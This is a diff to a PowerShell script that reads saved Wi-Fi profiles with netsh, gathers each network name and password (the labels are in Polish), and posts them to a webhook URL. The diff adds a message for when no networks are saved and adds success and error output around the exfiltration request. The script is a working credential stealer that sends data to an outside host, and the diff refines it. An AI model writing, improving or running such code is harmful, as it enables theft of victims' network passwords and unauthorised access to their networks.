@@ -17,8 +17,15 @@ $profiles = netsh wlan show profiles | Select-String ":" | ForEach-Object {
     $message += "`nSSID: $name`nHASLO: $password`n"
 }
 
+if ($profiles.Count -eq 0) {
+    $message += "`nBRAK ZAPISANYCH SIECI Wi-Fi"
+}
+
 $body = @{ content = $message } | ConvertTo-Json
 
 try {
     Invoke-RestMethod -Uri $webhook -Method Post -ContentType "application/json" -Body $body
-} catch {}
+    Write-Host "OK!" -ForegroundColor Green
+} catch {
+    Write-Host "BLAD: $_" -ForegroundColor Red
+}
